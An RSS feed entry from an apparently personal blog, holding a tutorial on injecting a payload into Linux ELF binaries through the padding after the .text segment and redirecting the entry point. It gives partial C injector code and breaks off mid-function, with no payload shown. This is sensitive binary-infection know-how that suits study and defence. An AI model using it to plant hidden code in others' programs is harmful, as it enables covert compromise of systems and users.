<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>linux on Vlaghe&#39;s Blog</title>
    <link>https://vlagh3.github.io/tags/linux/</link>
    <description>Recent content in linux on Vlaghe&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 25 Apr 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://vlagh3.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Injecting ELF files</title>
      <link>https://vlagh3.github.io/posts/elf_inject/</link>
      <pubDate>Sat, 25 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/posts/elf_inject/</guid>
      <description>Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it. Ok, so with all of that being said let’s dive into it. Infection Technique
This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:</description>
      <content>&lt;p&gt;Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it.
Ok, so with all of that being said let’s dive into it.
Infection Technique&lt;/p&gt;
&lt;p&gt;This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Find the padding area between &lt;code&gt;.text&lt;/code&gt; section and the next segment in the program.&lt;/li&gt;
&lt;li&gt;Append the payload at the end of the &lt;code&gt;.text&lt;/code&gt; section &lt;em&gt;(in that padding area)&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Patch the ELF header to run the injected code at startup, this is done by modifying the entry point.&lt;/li&gt;
&lt;li&gt;Patch the payload, so it can resume the normal execution of the program &lt;em&gt;(original entry point)&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We are going to take advantage of the padding area &lt;em&gt;(that is almost always there)&lt;/em&gt; between segments. This basically happens because the operating system works with Page granularity and because of the way the segments are loaded into memory.&lt;/p&gt;
&lt;p&gt;Anyway, in general it’s an unused area at the end of the .text section. The size of the padding depends on the size of the code, so it may vary from program to program. For that reason, some programs may not be able to be injected. &lt;em&gt;(I will let you guys find another creative ways to make it more efficient and reliable. 🙂 )&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;writing-the-injector&#34;&gt;Writing the injector&lt;/h2&gt;
&lt;p&gt;I will not show the whole code. Instead, I will divide it in some of the most important functional blocks, so it will be easier to follow.
You can find the whole source code and some of the newest implementations &lt;a href=&#34;https://github.com/vlagh3/elij&#34;&gt;on github&lt;/a&gt;.
Opening and mapping the target file &amp;amp; the payload&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[]) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(argc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: %s &amp;lt;file to inject&amp;gt; &amp;lt;payload&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	target_fd    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open_and_map(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tsize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	payload_fd   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open_and_map(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;psize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;..
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code is pretty straightforward. We have a small check on the arguments we pass. After we pass (to the &lt;code&gt;open_and_map&lt;/code&gt; function) 2 variables that will store the file size and a pointer to the beginning of our file. Then, we get the file desciptors for both the payload and target file.&lt;/p&gt;
&lt;p&gt;Let’s take a look at the &lt;code&gt;open_and_map&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open_and_map&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filename, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;data) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_size(filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( (fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(filename, O_RDWR, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Failed to open &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function takes 3 arguments, as said earlier. First, we store the filesize with the helper function &lt;code&gt;get_size&lt;/code&gt; &lt;em&gt;(I’m not including it here, because it’s basically just calling stat on the filename and returning its size)&lt;/em&gt;. After, we open the file with read and write permissions and then the good old error checking.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mmap(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_EXEC,   MAP_SHARED, fd, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; MAP_FAILED )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Failed to mmap&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		close(fd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] File %s mapped and oppened (%d bytes) at %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, filename, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, data);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; fd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The second part of the function just maps the file into memory &lt;em&gt;(so we can make changes to the file without dealing with fread, lseek and all of that stuff; instead we use pointers. This way, we are now having a very convenient way to patch a file)&lt;/em&gt; and returns the file descriptor. Because of the two output parameters now we also have a pointer to the start of the file and it’s size.&lt;/p&gt;
&lt;p&gt;Now that we have access to our file we can store some information.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf_header &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) data;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e_point	   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_header&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_entry;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Entry point of %s: 0x%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)e_point)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can retrieve this kind of data because the pointer returned by &lt;code&gt;open_and_map&lt;/code&gt; function points to the actual content of the file. Thus we find the ELF header as the first thing in the file. The entry point is contained in the ELF header along with other useful information, so we just reference that information with the pointer that we’ve got to the ELF header. If you are  still confused about this, take a look at the &lt;a href=&#34;http://localhost:1313/posts/elf_struct/&#34;&gt;Exploring the ELF file structure article&lt;/a&gt; that I made and then look at the specs to understand what kind of information is kept by this structure.&lt;/p&gt;
&lt;h3 id=&#34;finding-the-padding-between-the-two-load-segments&#34;&gt;Finding the padding between the two &lt;code&gt;LOAD&lt;/code&gt; segments.&lt;/h3&gt;
&lt;p&gt;Now we need to find the padding I was talking about in the beginning of this article. Some may reffer to it as a codecave.
Anyway, I wrote a function that it’s called from main.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_txt_seg_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_codecave(data, tsize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;txt_end, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cave_size);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; t_txt_seg_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_vaddr;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;find_codecave&lt;/code&gt; function will go through all the ELF segments and try to find a padding between the two &lt;code&gt;LOAD&lt;/code&gt; segments that we have discussed earlier. It returns a pointer to the first LOAD segment structure that we will need later. It also returns the offset in the file to the padding and it’s size.&lt;/p&gt;
&lt;p&gt;After we get all of that, we store the base virtual address where the code will be loaded into memory for that specific segment. This is usually &lt;code&gt;0x400000&lt;/code&gt;, but I wanted to be sure about this.
The &lt;code&gt;find_codecave&lt;/code&gt; function looks like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Elf64_Phdr&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;find_codecave&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr_elf, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fsize, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cave_size) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Declare the needed variables.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Calculate the elf segment ptr.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Get the total number of segments.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ehdr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ptr_elf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Phdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;txt_segment, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;elf_segment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Phdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ehdr&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_phoff);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; total_segments &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_phnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; codecave &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; txt_end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Traverse all the segments with type of PT_LOAD.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Get a pointer to the entry and the offset ,of the one with execute permissions.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Find codecave between the 2 segments.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; total_segments; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// printf(&amp;#34;[%d] V_addr: %x\n&amp;#34;, i, elf_segment-&amp;gt;p_vaddr + elf_segment-&amp;gt;p_filesz);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; PT_LOAD &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_flags &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] (#%d) LOAD segment found w execute flag (%d bytes).&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, i, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_filesz);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			txt_segment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_segment;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			txt_end		&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_filesz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; PT_LOAD &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; txt_end) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; codecave )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] (#%d) LOAD segment that can be injected found (%d bytes) near .text at offset: %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					   i, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_filesz, (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				codecave &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; txt_end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
